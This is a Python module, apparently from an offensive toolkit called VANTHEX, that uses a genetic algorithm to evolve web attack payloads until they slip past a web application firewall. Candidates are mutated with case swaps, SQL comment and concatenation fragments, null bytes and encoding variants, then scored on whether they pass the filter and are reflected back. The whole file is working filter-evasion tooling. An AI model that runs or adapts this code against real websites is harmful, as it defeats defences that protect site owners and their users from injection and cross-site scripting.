"""
Evolver v1 — genetic payload evolver for VANTHEX (anti-WAF).
OPERATOR-GATED: the send function (send_fn) is injected by the operator;
this module is pure evolutionary algorithm — mutation via
payloadforge.waf_variants + crossover.

Cycle: payload population -> send -> score (passes filter AND echoed)
-> top-k selection -> mutation/crossover -> next generation.
Returns the best payload + generation statistics.
"""
import random as _rnd

import payloadforge as _pf

MAX_GENERATIONS = 6
POP_SIZE = 12
ELITE = 3


def _mutate(payload, blocked=()):
    """One mutation: WAF variant / casing / comment insert / double-encode."""
    variants = _pf.waf_variants(payload, blocked=blocked)
    pool = list(variants) or [payload]
    c = _rnd.choice(pool)
    if _rnd.random() < 0.3:
        c = c.swapcase() if _rnd.random() < 0.5 else c.replace(" ", "/**/")
    if _rnd.random() < 0.2 and len(c) > 6:
        cut = _rnd.randrange(1, len(c) - 1)
        c = c[:cut] + _rnd.choice(["", "'||'", "%00"]) + c[cut:]
    return c


def _score(result):
    """Score the send_fn result: 1.0 = passed & echoed, 0.5 = passed only,
    0.0 = blocked/error. send_fn returns a dict
    {blocked: bool, echoed: bool}."""
    if not isinstance(result, dict):
        return 0.0
    if result.get("blocked"):
        return 0.0
    return 1.0 if result.get("echoed") else 0.5


def evolve(base_payload, send_fn, generations=MAX_GENERATIONS,
           pop_size=POP_SIZE, blocked=(), seed=1337):
    """Evolve a payload. send_fn(payload) -> dict. Returns
    {best, best_score, generations, history}."""
    if not callable(send_fn):
        raise ValueError("send_fn must be callable (operator-gated)")
    _rnd.seed(seed)
    pop = [base_payload] + [_mutate(base_payload, blocked)
                            for _ in range(pop_size - 1)]
    history = []
    best, best_score = base_payload, _score(send_fn(base_payload))
    for gen in range(generations):
        scored = sorted(((_score(send_fn(p)), p) for p in pop),
                        key=lambda x: -x[0])
        gen_best_score, gen_best = scored[0]
        if gen_best_score > best_score:
            best, best_score = gen_best, gen_best_score
        history.append({"gen": gen, "best_score": gen_best_score,
                        "avg": round(sum(s for s, _ in scored) / len(scored), 2)})
        if best_score >= 1.0:
            break
        elite = [p for _, p in scored[:ELITE]]
        pop = list(elite)
        while len(pop) < pop_size:
            if _rnd.random() < 0.7:
                pop.append(_mutate(_rnd.choice(elite), blocked))
            else:
                a, b = _rnd.choice(elite), _rnd.choice(elite)
                cut = len(a) // 2
                pop.append(a[:cut] + b[cut:])
    return {"best": best, "best_score": best_score,
            "generations": len(history), "history": history}
